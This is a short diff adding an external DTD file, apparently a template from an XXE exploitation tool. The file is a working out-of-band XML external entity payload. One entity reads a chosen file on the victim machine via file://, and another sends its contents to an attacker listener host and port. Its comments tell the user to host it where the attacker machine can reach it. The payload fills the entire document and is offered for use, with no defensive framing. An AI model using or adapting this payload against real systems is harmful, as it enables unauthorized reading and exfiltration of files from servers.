@@ -1,0 +1,3 @@
+<!-- Put this file in a web server reachable by the attacker machine -->
+<!ENTITY % ResourceToRead SYSTEM "file://${reqUrl.query.f}"> <!-- File to read in victim machine -->
+<!ENTITY % LoadOOBEntity "<!ENTITY &#37; OOB SYSTEM 'http://<IP_ATTACKER_LISTENER>:${LISTEN_PORT}/?p=%ResourceToRead;'>"> <!-- Listener on the attacker machine -->
